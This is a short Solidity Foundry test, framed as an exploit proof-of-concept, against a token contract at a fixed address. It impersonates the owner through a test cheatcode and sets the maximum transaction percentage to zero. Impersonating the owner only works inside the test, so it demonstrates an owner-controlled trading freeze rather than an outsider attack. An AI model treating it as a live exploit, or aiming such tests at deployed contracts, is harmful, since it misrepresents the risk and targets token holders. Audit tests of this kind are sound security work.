pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IWEB3 {
    function owner() external view returns (address);
    function setMaxTxPercent(uint256 maxTxPercent) external;
    function _maxTxAmount() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xd0c4BC1B89BbD105EeCb7EBa3f13E7648c0De38F;
    address attacker = address(this);
    IWEB3 public token;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IWEB3(TARGET);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        address owner = token.owner();

                vm.startPrank(owner);
                token.setMaxTxPercent(0);
                vm.stopPrank();

                assertEq(token._maxTxAmount(), 0);
        assertEq(token._maxTxAmount(), 0, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
